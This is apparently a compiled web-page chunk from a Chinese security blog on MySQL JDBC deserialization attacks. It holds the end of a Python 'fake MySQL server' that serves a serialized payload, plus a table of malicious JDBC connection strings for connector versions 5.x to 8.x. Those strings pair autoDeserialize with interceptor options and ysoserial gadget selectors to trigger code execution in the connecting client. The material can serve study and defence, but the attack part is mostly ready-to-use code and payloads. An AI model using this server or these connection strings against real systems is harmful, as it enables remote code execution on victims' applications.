'01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'\n                send_data(conn"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" payload)\n            break\n\n\n"),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("if __name__ == '__main__'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n    HOST ='0.0.0.0'\n    PORT = 3307\n\n    sk = socket.socket(socket.AF_INET"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" socket.SOCK_STREAM)\n    "),t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间")]),a._v("\n    sk.setsockopt(socket.SOL_SOCKET"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" socket.SO_REUSEADDR"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" 1)\n    sk.bind((HOST"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(' PORT))\n    sk.listen(1)\n    print("start fake mysql server listening on '),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("{")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("{")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("}")]),a._v('".format(HOST'),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v("PORT))\n\n    run()\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br"),t("span",{staticClass:"line-number"},[a._v("7")]),t("br"),t("span",{staticClass:"line-number"},[a._v("8")]),t("br"),t("span",{staticClass:"line-number"},[a._v("9")]),t("br"),t("span",{staticClass:"line-number"},[a._v("10")]),t("br"),t("span",{staticClass:"line-number"},[a._v("11")]),t("br"),t("span",{staticClass:"line-number"},[a._v("12")]),t("br"),t("span",{staticClass:"line-number"},[a._v("13")]),t("br"),t("span",{staticClass:"line-number"},[a._v("14")]),t("br"),t("span",{staticClass:"line-number"},[a._v("15")]),t("br"),t("span",{staticClass:"line-number"},[a._v("16")]),t("br"),t("span",{staticClass:"line-number"},[a._v("17")]),t("br"),t("span",{staticClass:"line-number"},[a._v("18")]),t("br"),t("span",{staticClass:"line-number"},[a._v("19")]),t("br"),t("span",{staticClass:"line-number"},[a._v("20")]),t("br"),t("span",{staticClass:"line-number"},[a._v("21")]),t("br"),t("span",{staticClass:"line-number"},[a._v("22")]),t("br"),t("span",{staticClass:"line-number"},[a._v("23")]),t("br"),t("span",{staticClass:"line-number"},[a._v("24")]),t("br"),t("span",{staticClass:"line-number"},[a._v("25")]),t("br"),t("span",{staticClass:"line-number"},[a._v("26")]),t("br"),t("span",{staticClass:"line-number"},[a._v("27")]),t("br"),t("span",{staticClass:"line-number"},[a._v("28")]),t("br"),t("span",{staticClass:"line-number"},[a._v("29")]),t("br"),t("span",{staticClass:"line-number"},[a._v("30")]),t("br"),t("span",{staticClass:"line-number"},[a._v("31")]),t("br"),t("span",{staticClass:"line-number"},[a._v("32")]),t("br"),t("span",{staticClass:"line-number"},[a._v("33")]),t("br"),t("span",{staticClass:"line-number"},[a._v("34")]),t("br"),t("span",{staticClass:"line-number"},[a._v("35")]),t("br"),t("span",{staticClass:"line-number"},[a._v("36")]),t("br"),t("span",{staticClass:"line-number"},[a._v("37")]),t("br"),t("span",{staticClass:"line-number"},[a._v("38")]),t("br"),t("span",{staticClass:"line-number"},[a._v("39")]),t("br"),t("span",{staticClass:"line-number"},[a._v("40")]),t("br"),t("span",{staticClass:"line-number"},[a._v("41")]),t("br"),t("span",{staticClass:"line-number"},[a._v("42")]),t("br"),t("span",{staticClass:"line-number"},[a._v("43")]),t("br"),t("span",{staticClass:"line-number"},[a._v("44")]),t("br"),t("span",{staticClass:"line-number"},[a._v("45")]),t("br"),t("span",{staticClass:"line-number"},[a._v("46")]),t("br"),t("span",{staticClass:"line-number"},[a._v("47")]),t("br"),t("span",{staticClass:"line-number"},[a._v("48")]),t("br"),t("span",{staticClass:"line-number"},[a._v("49")]),t("br"),t("span",{staticClass:"line-number"},[a._v("50")]),t("br"),t("span",{staticClass:"line-number"},[a._v("51")]),t("br"),t("span",{staticClass:"line-number"},[a._v("52")]),t("br"),t("span",{staticClass:"line-number"},[a._v("53")]),t("br"),t("span",{staticClass:"line-number"},[a._v("54")]),t("br"),t("span",{staticClass:"line-number"},[a._v("55")]),t("br"),t("span",{staticClass:"line-number"},[a._v("56")]),t("br"),t("span",{staticClass:"line-number"},[a._v("57")]),t("br"),t("span",{staticClass:"line-number"},[a._v("58")]),t("br"),t("span",{staticClass:"line-number"},[a._v("59")]),t("br"),t("span",{staticClass:"line-number"},[a._v("60")]),t("br"),t("span",{staticClass:"line-number"},[a._v("61")]),t("br"),t("span",{staticClass:"line-number"},[a._v("62")]),t("br"),t("span",{staticClass:"line-number"},[a._v("63")]),t("br"),t("span",{staticClass:"line-number"},[a._v("64")]),t("br"),t("span",{staticClass:"line-number"},[a._v("65")]),t("br"),t("span",{staticClass:"line-number"},[a._v("66")]),t("br"),t("span",{staticClass:"line-number"},[a._v("67")]),t("br"),t("span",{staticClass:"line-number"},[a._v("68")]),t("br"),t("span",{staticClass:"line-number"},[a._v("69")]),t("br"),t("span",{staticClass:"line-number"},[a._v("70")]),t("br"),t("span",{staticClass:"line-number"},[a._v("71")]),t("br"),t("span",{staticClass:"line-number"},[a._v("72")]),t("br"),t("span",{staticClass:"line-number"},[a._v("73")]),t("br"),t("span",{staticClass:"line-number"},[a._v("74")]),t("br"),t("span",{staticClass:"line-number"},[a._v("75")]),t("br"),t("span",{staticClass:"line-number"},[a._v("76")]),t("br"),t("span",{staticClass:"line-number"},[a._v("77")]),t("br"),t("span",{staticClass:"line-number"},[a._v("78")]),t("br"),t("span",{staticClass:"line-number"},[a._v("79")]),t("br"),t("span",{staticClass:"line-number"},[a._v("80")]),t("br"),t("span",{staticClass:"line-number"},[a._v("81")]),t("br"),t("span",{staticClass:"line-number"},[a._v("82")]),t("br"),t("span",{staticClass:"line-number"},[a._v("83")]),t("br"),t("span",{staticClass:"line-number"},[a._v("84")]),t("br"),t("span",{staticClass:"line-number"},[a._v("85")]),t("br"),t("span",{staticClass:"line-number"},[a._v("86")]),t("br"),t("span",{staticClass:"line-number"},[a._v("87")]),t("br"),t("span",{staticClass:"line-number"},[a._v("88")]),t("br"),t("span",{staticClass:"line-number"},[a._v("89")]),t("br"),t("span",{staticClass:"line-number"},[a._v("90")]),t("br"),t("span",{staticClass:"line-number"},[a._v("91")]),t("br"),t("span",{staticClass:"line-number"},[a._v("92")]),t("br"),t("span",{staticClass:"line-number"},[a._v("93")]),t("br"),t("span",{staticClass:"line-number"},[a._v("94")]),t("br"),t("span",{staticClass:"line-number"},[a._v("95")]),t("br"),t("span",{staticClass:"line-number"},[a._v("96")]),t("br"),t("span",{staticClass:"line-number"},[a._v("97")]),t("br"),t("span",{staticClass:"line-number"},[a._v("98")]),t("br"),t("span",{staticClass:"line-number"},[a._v("99")]),t("br"),t("span",{staticClass:"line-number"},[a._v("100")]),t("br"),t("span",{staticClass:"line-number"},[a._v("101")]),t("br"),t("span",{staticClass:"line-number"},[a._v("102")]),t("br")])]),t("h2",{attrs:{id:"exp"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#exp"}},[a._v("#")]),a._v(" Exp")]),a._v(" "),t("p",[a._v("测试的时候把yso这个包也当做依赖加进来才能出发CC链。所以实战中最好全部跑一边，只要确定目标的版本没问题的话。\n"),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616239498908-5fd43fab-7daf-419e-b14f-dca665ad3b97.png#align=left&display=inline&height=932&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1864&originWidth=3052&size=570652&status=done&style=none&width=1526",alt:"image.png"}}),a._v(" "),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616239443837-399e98b0-b5d5-4b11-98f7-3f8525c0a433.png#align=left&display=inline&height=614&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1228&originWidth=2238&size=908491&status=done&style=none&width=1119",alt:"image.png"}}),a._v(" "),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616239370864-619822b8-0e08-46c8-a87c-e59df0f9e593.png#align=left&display=inline&height=494&margin=%5Bobject%20Object%5D&name=image.png&originHeight=988&originWidth=2646&size=458349&status=done&style=none&width=1323",alt:"image.png"}})]),a._v(" "),t("div",{staticClass:"language-yaml line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-yaml"}},[t("code",[a._v("ServerStatusDiffInterceptor触发\n"),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("8.x")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" jdbc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("mysql"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("//127.0.0.1"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("3306/test"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("?")]),a._v("autoDeserialize=true"),t("span",{pre:!0,attrs:{class:"token important"}},[a._v("&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc")]),a._v("\n\n"),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("6.x(属性名不同)")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" jdbc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("mysql"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("//127.0.0.1"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("3306/test"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("?")]),a._v("autoDeserialize=true"),t("span",{pre:!0,attrs:{class:"token important"}},[a._v("&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc")]),a._v("\n\n"),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("5.1.11及以上的5.x版本（包名没有了cj）")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" jdbc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("mysql"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("//127.0.0.1"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("3306/test"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("?")]),a._v("autoDeserialize=true"),t("span",{pre:!0,attrs:{class:"token important"}},[a._v("&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc")]),a._v("\n\n5.1.10及以下的5.1.X版本： 同上，但是需要连接后执行查询。\n\n"),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("5.0.x")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" 还没有ServerStatusDiffInterceptor这个东西┓( ´∀` )┏\n\ndetectCustomCollations触发：\n"),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("5.1.41及以上")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" 不可用\n\n"),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("5.1.29-5.1.40")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" jdbc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("mysql"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("//127.0.0.1"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("3306/test"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("?")]),a._v("detectCustomCollations=true"),t("span",{pre:!0,attrs:{class:"token important"}},[a._v("&autoDeserialize=true&user=yso_JRE8u20_calc")]),a._v("\n\n5.1.28"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("-")]),a._v("5.1.19： jdbc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("mysql"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("//127.0.0.1"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("3306/test"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("?")]),a._v("autoDeserialize=true"),t("span",{pre:!0,attrs:{class:"token important"}},[a._v("&user=yso_JRE8u20_calc")]),a._v("\n\n5.1.18以下的5.1.x版本： 不可用\n\n5.0.x版本不可用\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br"),t("span",{staticClass:"line-number"},[a._v("7")]),t("br"),t("span",{staticClass:"line-number"},[a._v("8")]),t("br"),t("span",{staticClass:"line-number"},[a._v("9")]),t("br"),t("span",{staticClass:"line-number"},[a._v("10")]),t("br"),t("span",{staticClass:"line-number"},[a._v("11")]),t("br"),t("span",{staticClass:"line-number"},[a._v("12")]),t("br"),t("span",{staticClass:"line-number"},[a._v("13")]),t("br"),t("span",{staticClass:"line-number"},[a._v("14")]),t("br"),t("span",{staticClass:"line-number"},[a._v("15")]),t("br"),t("span",{staticClass:"line-number"},[a._v("16")]),t("br"),t("span",{staticClass:"line-number"},[a._v("17")]),t("br"),t("span",{staticClass:"line-number"},[a._v("18")]),t("br"),t("span",{staticClass:"line-number"},[a._v("19")]),t("br"),t("span",{staticClass:"line-number"},[a._v("20")]),t("br"),t("span",{staticClass:"line-number"},[a._v("21")]),t("br")])]),t("h2",{attrs:{id:"补充"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#补充"}},[a._v("#")]),a._v(" 补充")]),a._v(" "),t("p",[a._v("可以配合Tomcat和Spring进行回显利用")]),a._v(" "),t("h2",{attrs:{id:"资料（原文）"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#资料（原文）"}},[a._v("#")]),a._v(" 资料（原文）")]),a._v(" "),t("p",[t("a",{attrs:{href:"https://xz.aliyun.com/t/9250",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://xz.aliyun.com/t/9250"),t("OutboundLink")],1),a._v(" "),t("a",{attrs:{href:"https://xz.aliyun.com/t/8159#toc-2",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://xz.aliyun.com/t/8159#toc-2"),t("OutboundLink")],1),a._v(" "),t("a",{attrs:{href:"https://github.com/fnmsd/MySQL_Fake_Server",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://github.com/fnmsd/MySQL_Fake_Server"),t("OutboundLink")],1)])])}),[],!1,null,null,null);t.default=e.exports}}]);